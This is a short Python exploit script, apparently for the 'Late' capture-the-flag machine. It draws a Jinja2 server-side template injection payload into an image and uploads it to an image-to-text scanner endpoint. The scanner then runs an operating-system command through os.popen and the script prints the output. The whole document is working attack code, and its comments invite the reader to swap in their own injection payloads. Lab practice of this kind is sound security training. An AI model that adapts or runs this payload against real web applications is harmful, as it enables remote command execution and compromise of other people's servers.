from posixpath import split
from xml.dom.minidom import Element
from PIL import Image, ImageDraw, ImageFont
import requests, html

host = "http://images.late.htb/scanner" # Host here.
 
field_name = "file"  # Fieldname in POST Request.
os_command = """ls -l /home/"""
commands = [""" {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('"""+os_command+"""').read() }} """] # Your command injection payloads here.

def newPayload(command, index):
    font = ImageFont.truetype("./CamingoCode-Bold.ttf", 26)
    img = Image. new('RGB', (6000,250), color =(255,255,255, 0))
    imageDraw = ImageDraw.Draw(img)
    imageDraw.text((10, 10), command, fill=(0,0,0, 0), font=font)
    filename = f"exploit_{index}.jpg" 
    img.save(filename)
    return filename 

for index, command in enumerate(commands):
    
    payload_filename = newPayload(command, index)
    payload_file = open(payload_filename, 'rb')
    payload_file = {field_name: payload_file}

    req_response = requests.post(host, files=payload_file) 

    print(f"\nRESULT FOR: {command}",end="\n\n")
    req_response = html.unescape(req_response.text.replace("<p>","").replace("</p>","").replace("[","").replace("]",""))

    req_response = req_response.split("\\n', ")

    for element in req_response:
        print(element.replace("'",""), end="\n")

